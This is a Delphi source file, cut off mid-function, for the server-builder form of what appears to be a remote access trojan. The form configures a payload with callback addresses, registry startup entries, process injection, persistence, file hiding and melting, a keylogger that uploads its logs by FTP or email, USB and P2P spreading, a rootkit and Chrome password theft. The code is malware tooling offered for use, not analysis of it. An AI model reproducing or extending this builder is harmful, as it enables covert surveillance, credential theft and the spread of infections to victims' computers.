unit UnitCreateServer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ComCtrls, StdCtrls, Buttons;

type
  TFormCreateServer = class(TForm)
    BitBtn1: TBitBtn;
    BitBtn2: TBitBtn;
    BitBtn3: TBitBtn;
    BitBtn4: TBitBtn;
    BitBtn5: TBitBtn;
    BitBtn6: TBitBtn;
    CheckBox1: TCheckBox;
    CheckBox10: TCheckBox;
    CheckBox11: TCheckBox;
    CheckBox12: TCheckBox;
    CheckBox13: TCheckBox;
    CheckBox14: TCheckBox;
    CheckBox15: TCheckBox;
    CheckBox16: TCheckBox;
    CheckBox17: TCheckBox;
    CheckBox18: TCheckBox;
    CheckBox19: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox20: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    CheckBox6: TCheckBox;
    CheckBox7: TCheckBox;
    CheckBox8: TCheckBox;
    CheckBox9: TCheckBox;
    ComboBox6: TComboBox;
    Edit1: TEdit;
    Edit13: TEdit;
    Edit14: TEdit;
    Edit16: TEdit;
    Edit17: TEdit;
    Edit18: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Edit6: TEdit;
    Edit7: TEdit;
    Edit8: TEdit;
    Edit9: TEdit;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    GroupBox3: TGroupBox;
    GroupBox4: TGroupBox;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Image5: TImage;
    Label1: TLabel;
    Label2: TLabel;
    Label23: TLabel;
    Label24: TLabel;
    Label26: TLabel;
    Label27: TLabel;
    Label28: TLabel;
    Label31: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Memo1: TMemo;
    Memo2: TMemo;
    OpenDialog1: TOpenDialog;
    PageControl1: TPageControl;
    Panel1: TPanel;
    RadioGroup1: TRadioGroup;
    RadioGroup2: TRadioGroup;
    RadioGroup3: TRadioGroup;
    SaveDialog1: TSaveDialog;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet3: TTabSheet;
    ListView1: TListView;
    BitBtn7: TBitBtn;
    BitBtn8: TBitBtn;
    BitBtn9: TBitBtn;
    CheckBox21: TCheckBox;
    ListView2: TListView;
    CheckBox22: TCheckBox;
    CheckBox23: TCheckBox;
    CheckBox24: TCheckBox;
    CheckBox25: TCheckBox;
    Label6: TLabel;
    Edit10: TEdit;
    Label3: TLabel;
    RadioGroup4: TRadioGroup;
    Edit11: TEdit;
    CheckBox26: TCheckBox;
    CheckBox27: TCheckBox;
    CheckBox29: TCheckBox;
    CheckBox28: TCheckBox;
    Edit12: TEdit;
    CheckBox30: TCheckBox;
    CheckBox31: TCheckBox;
    Edit15: TEdit;
    CheckBox32: TCheckBox;
    CheckBox33: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure RadioGroup1Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure BitBtn4Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure CheckBox4Click(Sender: TObject);
    procedure CheckBox6Click(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure CheckBox19Click(Sender: TObject);
    procedure Edit1Enter(Sender: TObject);
    procedure Edit1Exit(Sender: TObject);
    procedure Edit18KeyPress(Sender: TObject; var Key: Char);
    procedure BitBtn7Click(Sender: TObject);
    procedure BitBtn9Click(Sender: TObject);
    procedure BitBtn8Click(Sender: TObject);
    procedure BitBtn6Click(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure PageControl1Change(Sender: TObject);
    procedure CheckBox22Click(Sender: TObject);
    procedure CheckBox21Click(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure CheckBox2Click(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure RadioGroup4Click(Sender: TObject);
    procedure BitBtn5Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure CheckBox27Click(Sender: TObject);
    procedure Memo1KeyPress(Sender: TObject; var Key: Char);
    procedure CheckBox28Click(Sender: TObject);
    procedure CheckBox29Click(Sender: TObject);
    procedure Edit14Change(Sender: TObject);
    procedure CheckBox31Click(Sender: TObject);
    procedure CheckBox30Click(Sender: TObject);
    procedure CheckBox26Click(Sender: TObject);
    procedure CheckBox32Click(Sender: TObject);
    procedure CheckBox33Click(Sender: TObject);
  private
    { Private declarations }
    ProfileFile: string;

    procedure AtualizarStringsTraduzidas;
    procedure ListarProfiles;
    procedure CarregarProfile(FileName: string);
    procedure SalvarProfile(FileName: string);
    function VerificarDados: boolean;
    procedure GerarRelatorio;
    function VerificarEmailSettings: boolean;
    procedure AtualizarMsg;
  public
    { Public declarations }
    bType, mType: integer;

    Enderecos: array [0..19] of string;
    Identificacao, CreateServerPassword: string;
    MostrarSenha: boolean;
    InstalarServidor: boolean;
    LocalInstalacao: string;
    Inicializacao: array [0..3] of string;
    hklm, hkcu, ActiveXStartUp, PoliciesStartUp: boolean;
    infiltrarprocesso: integer;
    infiltrarprocessonome: string;
    persistencia, ocultar, mudardata, MeltOriginalFile: boolean;
    mutexname: string;
    Diretorio: string;
    NomeArquivo: string;
    ExibirMensagem: boolean;
    IconeMsg: integer;
    BotaoMsg: integer;
    Mensagem: array [0..1] of string;
    Keylogger: array [0..2] of boolean;
    KeyloggerStrings: array [0..5] of string;
    KeyloggerTimer: integer;
    Debug: array [0..11] of boolean;
    Compactar: boolean;
    p2pNames: string;
    usbspreader, p2pspreader, rootkitON, chromepass: boolean;
    chromepasslink: string;

    function StreamToString(mStream: TStream; var Size: int64): string;
    // essa função de conversão só funciona com streams como resource.
    // para as outras usar a que tem na UnitConexao
  end;

var
  FormCreateServer: TFormCreateServer;
  ThreadMail: cardinal = 0;

implementation

{$R *.dfm}

uses
  UnitPrincipal,
  Math,
  UnitCryptString,
  iconchanger,
  UnitStrings,
  UnitComandos,
  FuncoesDiversasCliente,
  IniFiles,
  EditSvr,
  ShellAPI,
  UnitBindFiles,
  uftp;

function ReplaceEnter(str: string): string;
begin
  result := replacestring('[ENTER]', #13#10, str);
end;

procedure TFormCreateServer.AtualizarStringsTraduzidas;
begin
  TabSheet1.Caption := traduzidos[36];
  TabSheet2.Caption := traduzidos[37];
  TabSheet4.Caption := traduzidos[38];
  TabSheet5.Caption := traduzidos[39];
  TabSheet6.Caption := traduzidos[40];
  TabSheet7.Caption := traduzidos[41];
  TabSheet3.Caption := traduzidos[79];
  Listview1.Column[0].Caption := traduzidos[79];
  Bitbtn7.Caption := traduzidos[80];
  Bitbtn8.Caption := traduzidos[81];
  Bitbtn9.Caption := traduzidos[32];
  ListView2.Column[0].Caption := traduzidos[42];
  ListView2.Column[1].Caption := traduzidos[26];
  Bitbtn1.Caption := traduzidos[43];
  Bitbtn2.Caption := traduzidos[32];
  Label1.Caption := traduzidos[2];
  Label2.Caption := traduzidos[44];
  Checkbox1.Caption := traduzidos[72];
  RadioGroup1.Caption := traduzidos[45];
  RadioGroup1.Items.Strings[3] := traduzidos[46];
  RadioGroup1.Items.Strings[4] := traduzidos[47];
  GroupBox1.Caption := traduzidos[48];
  Label3.Caption := traduzidos[49];
  Label4.Caption := traduzidos[50];
  RadioGroup4.Caption := traduzidos[100];
  RadioGroup4.Items.Strings[0] := traduzidos[101];
  RadioGroup4.Items.Strings[1] := traduzidos[102];
  RadioGroup4.Items.Strings[2] := traduzidos[47];
  Checkbox23.Caption := traduzidos[103];
  Checkbox24.Caption := traduzidos[104];
  Checkbox25.Caption := traduzidos[105];
  Checkbox26.Caption := traduzidos[116];
  RadioGroup2.Caption := traduzidos[51];
  RadioGroup3.Caption := traduzidos[52];
  Checkbox21.Caption := traduzidos[89];
  Checkbox22.Caption := traduzidos[99];
  RadioGroup2.Items.Strings[0] := traduzidos[53];
  RadioGroup2.Items.Strings[1] := traduzidos[54];
  RadioGroup2.Items.Strings[2] := traduzidos[55];
  RadioGroup2.Items.Strings[3] := traduzidos[56];
  RadioGroup2.Items.Strings[4] := traduzidos[57];
  RadioGroup3.Items.Strings[0] := traduzidos[58];
  RadioGroup3.Items.Strings[1] := traduzidos[58] + ', ' + traduzidos[59];
  RadioGroup3.Items.Strings[2] := traduzidos[60] + ', ' + traduzidos[59];
  RadioGroup3.Items.Strings[3] := traduzidos[25] + ', ' + traduzidos[24];
  RadioGroup3.Items.Strings[4] := traduzidos[25] + ', ' + traduzidos[24] + ', ' + traduzidos[59];
  RadioGroup3.Items.Strings[5] := traduzidos[61] + ', ' + traduzidos[60] + ', ' + traduzidos[62];
  BitBtn4.Caption := traduzidos[73];
  Checkbox4.Caption := traduzidos[63];
  GroupBox2.Caption := traduzidos[64];
  Checkbox5.Caption := traduzidos[69];
  Checkbox6.Caption := traduzidos[74];
  GroupBox3.Caption := traduzidos[75];
  Label23.Caption := traduzidos[65];
  Label24.Caption := traduzidos[49];
  Label5.Caption := traduzidos[66];
  Label31.Caption := traduzidos[67];
  Label28.Caption := traduzidos[68];
  Bitbtn5.Caption := traduzidos[73];
  GroupBox4.Caption := traduzidos[76];
  Checkbox18.Caption := traduzidos[47];
  Checkbox19.Caption := traduzidos[70];
  Checkbox20.Caption := traduzidos[71];
  BitBtn6.Caption := traduzidos[41];
  Caption := traduzidos[41];
  Checkbox29.Caption := traduzidos[462];
end;

procedure TFormCreateServer.FormCreate(Sender: TObject);
begin
  FormPrincipal.ImageListIcons.GetBitmap(250, Bitbtn1.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(283, Bitbtn2.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(250, Bitbtn3.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(261, Bitbtn4.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(261, Bitbtn5.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(284, Bitbtn6.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(250, Bitbtn7.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(254, Bitbtn8.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(283, Bitbtn9.Glyph);
  // estou fazendo uma função que cancele a tentativa de envio de emails
  // tentar jogar em uma thread e colocar o botão cancelar para finalizar a thread....
end;

procedure TFormCreateServer.CheckBox1Click(Sender: TObject);
begin
  if Checkbox1.Checked then edit2.PasswordChar := #0 else edit2.PasswordChar := '*';
end;

procedure TFormCreateServer.RadioGroup1Click(Sender: TObject);
begin
  Edit3.Enabled := RadioGroup1.ItemIndex = 4;
end;

function GenID:String;
var
b, x: byte;
begin
  Result := '{';
  Randomize;
  for b:= 1 to 8 do
  begin
    if Random(100) > 50 then Result := Result + chr(RandomRange(48,57))
    else Result := Result + chr(RandomRange(65,90));
  end;
  Result := Result + '-';
  for x:= 1 to 3 do
  begin
    for b:= 1 to 4 do
    begin
      if Random(100) < 50 then Result := Result + chr(RandomRange(48,57))
      else Result := Result + chr(RandomRange(65,90));
    end;
    Result := Result + '-';
  end;
  for b:= 1 to 12 do
  begin
    if Random(100) < 50 then Result := Result + chr(RandomRange(48,57))
    else Result := Result + chr(RandomRange(65,90));
  end;
  Result := Result + '}';
end;

procedure TFormCreateServer.BitBtn3Click(Sender: TObject);
begin
  Edit6.Text := GenId;
end;

procedure TFormCreateServer.BitBtn4Click(Sender: TObject);
begin
  AtualizarMsg;
  messagebox(FormCreateServer.Handle, pchar(Memo1.Text), pchar(edit9.Text), MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST or bType or mType);
end;

procedure TFormCreateServer.FormShow(Sender: TObject);
begin
  tabsheet1.TabVisible := false;
  tabsheet2.TabVisible := false;
  tabsheet4.TabVisible := false;
  tabsheet5.TabVisible := false;
  tabsheet6.TabVisible := false;
  tabsheet7.TabVisible := false;

  ListarProfiles;

  PageControl1.ActivePage := tabsheet3;
  AtualizarStringsTraduzidas;

  memo2.Clear;
  FormBindFiles.ListView2.Clear;
  Edit5.Clear;
  Checkbox29.Checked := false;
end;

procedure TFormCreateServer.CheckBox4Click(Sender: TObject);
begin
  checkbox5.Enabled := checkbox4.Checked;
  checkbox6.Enabled := checkbox4.Checked;
  edit13.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  edit14.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  edit16.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  edit17.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  edit18.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  combobox6.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
  bitbtn5.Enabled := (checkbox4.Checked) and (checkbox6.Checked = true);
end;

procedure TFormCreateServer.CheckBox6Click(Sender: TObject);
begin
  edit13.Enabled := checkbox6.Checked;
  edit14.Enabled := checkbox6.Checked;
  edit16.Enabled := checkbox6.Checked;
  edit17.Enabled := checkbox6.Checked;
  edit18.Enabled := checkbox6.Checked;
  combobox6.Enabled := checkbox6.Checked;
  bitbtn5.Enabled := checkbox6.Checked;
end;

procedure TFormCreateServer.Image1Click(Sender: TObject);
var
  tempstr: string;
begin
  opendialog1.Filter := 'Executables (*.exe) - Icons (*.ico)' + '|*.ico;*.exe';
  opendialog1.InitialDir := extractfilepath(paramstr(0));
  opendialog1.Title := Application.Title + ' ' + VersaoPrograma;

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    if lowercase(sysutils.extractfileext(OpenDialog1.FileName)) = '.ico' then
    begin
      image1.Picture.Icon.LoadFromFile(opendialog1.FileName);
      tempstr := extractfilename(OpenDialog1.FileName);
      tempstr := replacestring(extractfileext(tempstr), '', tempstr);
      tempstr := FormPrincipal.iconfolder + tempstr + '.ico';

      ForceDirectories(extractfilepath(tempstr));
    end else
    if lowercase(sysutils.extractfileext(OpenDialog1.FileName)) = '.exe' then
    begin
      try
        tempstr := extractfilename(OpenDialog1.FileName);
        tempstr := replacestring(extractfileext(tempstr), '', tempstr);
        tempstr := FormPrincipal.iconfolder + tempstr + '.ico';

        ForceDirectories(extractfilepath(tempstr));

        SaveApplicationIconGroup(pchar(tempstr), pchar(OpenDialog1.FileName));
        except
        begin
          MessageDlg(pchar(traduzidos[35]), mtError, [mbOK], 0);
          deletefile(tempstr);
          exit;
        end;
      end;
      image1.Picture.Icon.LoadFromFile(tempstr);
    end else exit;
  end else exit;
  image1.Picture.Icon.SaveToFile(tempstr);
end;

procedure TFormCreateServer.CheckBox19Click(Sender: TObject);
begin
  Image1.Visible := checkbox19.Checked;
end;

procedure TFormCreateServer.Edit1Enter(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clSkyBlue;
  if (Ctrl is TListView) then
  TListView(Ctrl).Color := clSkyBlue;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clSkyBlue;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clSkyBlue;
  if (Ctrl is TListBox) then
  TListBox(Ctrl).Color := clSkyBlue;
end;

procedure TFormCreateServer.Edit1Exit(Sender: TObject);
var
  Ctrl: TWinControl;
begin
  if (Ctrl is TEdit) then
  TEdit(Ctrl).Color := clWindow;
  if (Ctrl is TMemo) then
  TMemo(Ctrl).Color := clWindow;
  if (Ctrl is TListView) then
  TListView(Ctrl).Color := clWindow;
  if (Ctrl is TRichEdit) then
  TRichEdit(Ctrl).Color := clWindow;
  if (Ctrl is TComboBox) then
  TComboBox(Ctrl).Color := clWindow;
  if (Ctrl is TListBox) then
  TListBox(Ctrl).Color := clWindow;
end;

procedure TFormCreateServer.Edit18KeyPress(Sender: TObject; var Key: Char);
begin
  If not(key in['0'..'9', #08]) then
  begin
    beep;
    key := #0;
  end;
end;

procedure ListFileDir(Path: string; FileList: TStrings; Extensao: string = '*.*');
var
  SR: TSearchRec;
begin
  if FindFirst(Path + Extensao, faAnyFile, SR) = 0 then
  begin
    repeat
      if (SR.Attr <> faDirectory) then
      begin
        FileList.Add(SR.Name);
      end;
    until FindNext(SR) <> 0;
    FindClose(SR);
  end;
end;

procedure TFormCreateServer.ListarProfiles;
var
  List: TStringList;
  item: TListItem;
  i: integer;
  TempStr: string;
begin
  ListView1.Clear;
  
  List := TStringList.Create;
  ListFileDir(FormPrincipal.ProfilesFolder, List, '*.ini');
  if list.Count > 0 then
  for i := 0 to List.Count - 1 do
  begin
    Item := ListView1.Items.Add;
    Tempstr := ExtractFileName(List.Strings[i]);
    delete(Tempstr, length(Tempstr) - 3, 4);
    Item.Caption := Tempstr;
    Item.ImageIndex := 311;
  end;
  List.Free;
end;

procedure TFormCreateServer.CarregarProfile(FileName: string);
var
  IniFile: TIniFile;
  i: integer;
  Item: TListItem;
  Tempstr, Tempstr2: string;
  TempInt: integer;
begin
  ProfileFile := FileName;

  IniFile := TIniFile.Create(ProfileFile);
  ListView2.Items.Clear;
  
  for i := 0 to 19 do
  begin
    Tempstr := IniFile.ReadString('settings', 'endereco' + inttostr(i), '');
    if pos('|', Tempstr) >= 1 then
    begin
      Tempstr2 := Tempstr;
      delete(tempstr2, 1, pos('|', Tempstr2));
      Tempstr := copy(tempstr, 1, pos('|', Tempstr) - 1);
      try
        TempInt := strtoint(tempstr2);
        if (TempInt > 65535) or (TempInt < 1) then continue;
        except
        continue
      end;
      Item := ListView2.Items.Add;
      Item.Caption := Tempstr;
      Item.SubItems.Add(inttostr(TempInt));
    end;
  end;

  Identificacao := IniFile.ReadString('settings', 'identificacao', '');
  CreateServerPassword := IniFile.ReadString('settings', 'createserverpassword', '');
  MostrarSenha := IniFile.ReadBool('settings', 'mostrarsenha', true);

  Edit1.Text := Identificacao;
  Edit2.Text := CreateServerPassword;
  Checkbox1.Checked := MostrarSenha;

  LocalInstalacao := IniFile.ReadString('settings', 'localinstalacao', '');

  if pos('|', LocalInstalacao) >= 1 then
  begin
    try
      strtoint(copy(LocalInstalacao, 1, pos('|', LocalInstalacao) - 1));
      except
      LocalInstalacao := '1|z:\dir\install\';
    end;
  end else LocalInstalacao := '1|z:\dir\install\';

  TempInt := strtoint(copy(LocalInstalacao, 1, pos('|', LocalInstalacao) - 1));
  delete(LocalInstalacao, 1, pos('|', LocalInstalacao));

  if TempInt > 4 then TempInt := 0;
  Radiogroup1.ItemIndex := TempInt;
  Edit3.Text := LocalInstalacao;

  for i := 0 to 3 do
  Inicializacao[i] := IniFile.ReadString('settings', 'inicializacao' + inttostr(i), '');

  InstalarServidor := IniFile.ReadBool('settings', 'instalarservidor', false);
  Diretorio := IniFile.ReadString('settings', 'diretorio', '');
  NomeArquivo := IniFile.ReadString('settings', 'nomearquivo', '');
  hklm := IniFile.ReadBool('settings', 'hklm', false);
  hkcu := IniFile.ReadBool('settings', 'hkcu', false);
  ActiveXStartUp := IniFile.ReadBool('settings', 'activexstartup', false);
  PoliciesStartUp := IniFile.ReadBool('settings', 'policiesstartup', false);
  infiltrarprocesso := IniFile.ReadInteger('settings', 'infiltrarprocesso', 1);
  infiltrarprocessonome := IniFile.ReadString('settings', 'infiltrarprocessonome', '');
  persistencia := IniFile.ReadBool('settings', 'persistencia', false);
  ocultar := IniFile.ReadBool('settings', 'ocultar', false);
  mudardata := IniFile.ReadBool('settings', 'mudardata', false);
  mutexname := IniFile.ReadString('settings', 'mutexname', '');
  MeltOriginalFile := IniFile.ReadBool('settings', 'melt', false);

  radiogroup4.ItemIndex := infiltrarprocesso;
  edit11.Text := infiltrarprocessonome;
  Checkbox23.Checked := persistencia;
  Checkbox24.Checked := ocultar;
  Checkbox25.Checked := mudardata;
  Checkbox26.Checked := MeltOriginalFile;
  edit10.Text := mutexname;
  checkbox22.Checked := InstalarServidor;
  edit4.Text := Diretorio;
  edit5.Text := NomeArquivo;
  edit6.Text := Inicializacao[0];
  edit7.Text := Inicializacao[1];
  edit8.Text := Inicializacao[2];
  edit12.Text := Inicializacao[3];
  Checkbox2.Checked := hklm;
  Checkbox3.Checked := hkcu;
  Checkbox27.Checked := ActiveXStartUp;
  Checkbox28.Checked := PoliciesStartUp;

  ExibirMensagem := IniFile.ReadBool('settings', 'exibirmensagem', false);
  IconeMsg := IniFile.ReadInteger('settings', 'iconemsg', 1);
  BotaoMsg := IniFile.ReadInteger('settings', 'botaomsg', 0);
  Mensagem[0] := IniFile.ReadString('settings', 'mensagem' + inttostr(0), '');
  Mensagem[1] := ReplaceEnter(IniFile.ReadString('settings', 'mensagem' + inttostr(1), ''));

  checkbox21.Checked := ExibirMensagem;
  if IconeMsg > 4 then IconeMsg := 1 else radiogroup2.ItemIndex := IconeMsg;
  if BotaoMsg > 5 then IconeMsg := 0 else radiogroup3.ItemIndex := BotaoMsg;
  edit9.Text := Mensagem[0];
  Memo1.Text := Mensagem[1];

  for i := 0 to 2 do
  Keylogger[i] := IniFile.ReadBool('settings', 'keylogger' + inttostr(i), true);
  for i := 0 to 4 do
  KeyloggerStrings[i] := IniFile.ReadString('settings', 'keyloggerstrings' + inttostr(i), '');
  KeyloggerTimer := IniFile.ReadInteger('settings', 'keyloggertimer', 5);

  Checkbox4.Checked := Keylogger[0];
  Checkbox5.Checked := Keylogger[1];
  Checkbox6.Checked := Keylogger[2];

  edit13.Text := KeyloggerStrings[0];
  edit14.Text := KeyloggerStrings[1];
  edit16.Text := KeyloggerStrings[2];
  edit17.Text := Decode64(KeyloggerStrings[3]);
  edit18.Text := KeyloggerStrings[4];
  Combobox6.ItemIndex := KeyloggerTimer;

  for i := 0 to 11 do
  Debug[i] := IniFile.ReadBool('settings', 'debug' + inttostr(i), true);

  Checkbox7.Checked := Debug[0];
  Checkbox8.Checked := Debug[1];
  Checkbox9.Checked := Debug[2];
  Checkbox10.Checked := Debug[3];
  Checkbox11.Checked := Debug[4];
  Checkbox12.Checked := Debug[5];
  Checkbox13.Checked := Debug[6];
  Checkbox14.Checked := Debug[7];
  Checkbox15.Checked := Debug[8];
  Checkbox16.Checked := Debug[9];
  Checkbox17.Checked := Debug[10];
  Checkbox18.Checked := Debug[11];

  Compactar := IniFile.ReadBool('settings', 'compactar', true);
  Checkbox20.Checked := Compactar;

  usbspreader := IniFile.ReadBool('settings', 'usbspreader', false);
  p2pspreader := IniFile.ReadBool('settings', 'p2pspreader', false);
  rootkitON := IniFile.ReadBool('settings', 'rootkiton', false);
  chromepass := IniFile.ReadBool('settings', 'chromepass', false);
  chromepasslink := IniFile.ReadString('settings', 'chromepasslink', '');

  Checkbox30.Checked := usbspreader;
  Checkbox31.Checked := p2pspreader;
  Checkbox32.Checked := rootkitON;
  Checkbox33.Checked := chromepass;

  p2pNames := IniFile.ReadString('settings', 'p2pnames', '');
  edit15.Text := p2pNames;

  IniFile.Free;
end;

procedure TFormCreateServer.SalvarProfile(FileName: string);
var
  IniFile: TIniFile;
  i: integer;
  resStream: TResourceStream;
begin
  if fileexists(FileName) = false then
  begin
    resStream := TResourceStream.Create(hInstance, 'PROFILES', 'profilefile');
    resStream.SaveToFile(FileName);
    resStream.Free;
  end;

  IniFile := TIniFile.Create(FileName);

  for i := 0 to 19 do
  if ListView2.Items.Item[i] <> nil then
  IniFile.WriteString('settings', 'endereco' + inttostr(i), ListView2.Items.Item[i].Caption + '|' + ListView2.Items.Item[i].SubItems.strings[0]) else
  IniFile.WriteString('settings', 'endereco' + inttostr(i), '');

  IniFile.WriteString('settings', 'identificacao', Edit1.Text);
  IniFile.WriteString('settings', 'createserverpassword', Edit2.Text);
  IniFile.WriteBool('settings', 'mostrarsenha', Checkbox1.Checked);

  IniFile.WriteBool('settings', 'instalarservidor', checkbox22.Checked);
  IniFile.WriteString('settings', 'localinstalacao', inttostr(radiogroup1.ItemIndex) + '|' + Edit3.Text);
  IniFile.WriteString('settings', 'inicializacao0', Edit6.Text);
  IniFile.WriteString('settings', 'inicializacao1', Edit7.Text);
  IniFile.WriteString('settings', 'inicializacao2', Edit8.Text);
  IniFile.WriteString('settings', 'inicializacao3', Edit12.Text);
  IniFile.WriteString('settings', 'diretorio', Edit4.Text);
  IniFile.WriteString('settings', 'nomearquivo', Edit5.Text);
  IniFile.WriteBool('settings', 'hklm', checkbox2.Checked);
  IniFile.WriteBool('settings', 'hkcu', checkbox3.Checked);
  IniFile.WriteBool('settings', 'activexstartup', checkbox27.Checked);
  IniFile.WriteBool('settings', 'policiesstartup', checkbox28.Checked);
  IniFile.writeInteger('settings', 'infiltrarprocesso', radiogroup4.ItemIndex);
  IniFile.writeString('settings', 'infiltrarprocessonome', edit11.Text);
  IniFile.WriteBool('settings', 'persistencia', checkbox23.Checked);
  IniFile.WriteBool('settings', 'ocultar', checkbox24.Checked);
  IniFile.WriteBool('settings', 'mudardata', checkbox25.Checked);
  IniFile.WriteBool('settings', 'melt', checkbox26.Checked);
  IniFile.WriteString('settings', 'mutexname', edit10.Text);

  IniFile.WriteBool('settings', 'exibirmensagem', checkbox21.Checked);
  IniFile.WriteInteger('settings', 'iconemsg', radiogroup2.ItemIndex);
  IniFile.WriteInteger('settings', 'botaomsg', radiogroup3.ItemIndex);
  IniFile.WriteString('settings', 'mensagem0', Edit9.Text);
  IniFile.WriteString('settings', 'mensagem1', replacestring(#13#10, '[ENTER]', Memo1.Text));

  IniFile.WriteBool('settings', 'keylogger0', checkbox4.Checked);
  IniFile.WriteBool('settings', 'keylogger1', checkbox5.Checked);
  IniFile.WriteBool('settings', 'keylogger2', checkbox6.Checked);
  IniFile.WriteString('settings', 'keyloggerstrings0', edit13.Text);
  IniFile.WriteString('settings', 'keyloggerstrings1', edit14.Text);
  IniFile.WriteString('settings', 'keyloggerstrings2', edit16.Text);
  IniFile.WriteString('settings', 'keyloggerstrings3', encode64(edit17.Text));
  IniFile.WriteString('settings', 'keyloggerstrings4', edit18.Text);
  IniFile.WriteInteger('settings', 'keyloggertimer', Combobox6.ItemIndex);

  IniFile.WriteBool('settings', 'debug0', Checkbox7.Checked);
  IniFile.WriteBool('settings', 'debug1', Checkbox8.Checked);
  IniFile.WriteBool('settings', 'debug2', Checkbox9.Checked);
  IniFile.WriteBool('settings', 'debug3', Checkbox10.Checked);
  IniFile.WriteBool('settings', 'debug4', Checkbox11.Checked);
  IniFile.WriteBool('settings', 'debug5', Checkbox12.Checked);
  IniFile.WriteBool('settings', 'debug6', Checkbox13.Checked);
  IniFile.WriteBool('settings', 'debug7', Checkbox14.Checked);
  IniFile.WriteBool('settings', 'debug8', Checkbox15.Checked);
  IniFile.WriteBool('settings', 'debug9', Checkbox16.Checked);
  IniFile.WriteBool('settings', 'debug10', Checkbox17.Checked);
  IniFile.WriteBool('settings', 'debug11', Checkbox18.Checked);

  IniFile.WriteBool('settings', 'compactar', Checkbox20.Checked);

  IniFile.WriteBool('settings', 'usbspreader', Checkbox30.Checked);
  IniFile.WriteBool('settings', 'p2pspreader', Checkbox31.Checked);
  IniFile.WriteBool('settings', 'rootkiton', Checkbox32.Checked);
  IniFile.WriteBool('settings', 'chromepass', Checkbox33.Checked);
  IniFile.WriteString('settings', 'p2pnames', edit15.Text);
  IniFile.WriteString('settings', 'chromepasslink', chromepasslink);

  IniFile.Free;
end;

procedure TFormCreateServer.BitBtn7Click(Sender: TObject);
var
  name: string;
  resStream: TResourceStream;
begin
  Bitbtn8.Enabled := false;
  Bitbtn9.Enabled := Bitbtn8.Enabled;

  name := traduzidos[77];
  if inputquery(pchar(traduzidos[77]), pchar(traduzidos[78]), name) then
  begin
    if fileexists(FormPrincipal.ProfilesFolder + name + '.ini') = true then
    begin
      if MessageDlg(pchar(traduzidos[96]), mtConfirmation, [mbOk, mbCancel], 0) = IdCancel then
      exit;
    end;

    ForceDirectories(FormPrincipal.ProfilesFolder);

    resStream := TResourceStream.Create(hInstance, 'PROFILES', 'profilefile');
    resStream.SaveToFile(FormPrincipal.ProfilesFolder + name + '.ini');
    resStream.Free;

    ProfileFile := FormPrincipal.ProfilesFolder + name + '.ini';
    ListarProfiles;
  end;
end;

procedure TFormCreateServer.BitBtn9Click(Sender: TObject);
begin
  Bitbtn8.Enabled := false;
  Bitbtn9.Enabled := Bitbtn8.Enabled;

  if Listview1.Selected <> nil then
  deletefile(FormPrincipal.ProfilesFolder + listview1.Selected.Caption + '.ini');
  ListarProfiles;
end;

procedure TFormCreateServer.BitBtn8Click(Sender: TObject);
begin
  if listview1.Selected <> nil then
  begin
    ProfileFile := FormPrincipal.ProfilesFolder + listview1.Selected.Caption + '.ini';

    if fileexists(profilefile) = false then
    begin
      MessageDlg(pchar(traduzidos[83]), mtWarning, [mbOK], 0);
      exit;
    end;

    CarregarProfile(ProfileFile);

    tabsheet1.TabVisible := true;
    tabsheet2.TabVisible := true;
    tabsheet4.TabVisible := true;
    tabsheet5.TabVisible := true;
    tabsheet6.TabVisible := true;
    tabsheet7.TabVisible := true;

    PageControl1.ActivePage := tabsheet1;
  end else
  begin
    MessageDlg(pchar(traduzidos[82]), mtWarning, [mbOK], 0);
    exit;
  end;
end;

function TFormCreateServer.StreamToString(mStream: TStream; var Size: int64): string;
// essa função de conversão só funciona com streams como resource.
// para as outras usar a que tem na UnitConexao
var
  I:Integer;
begin
  Result := '';
  Size := 0;
  if not Assigned(mStream) then Exit;
  SetLength(Result, mStream.Size);
  size := mStream.Size;
  for I := 0 to Pred(mStream.Size)   do
  try
    mStream.Position := I;
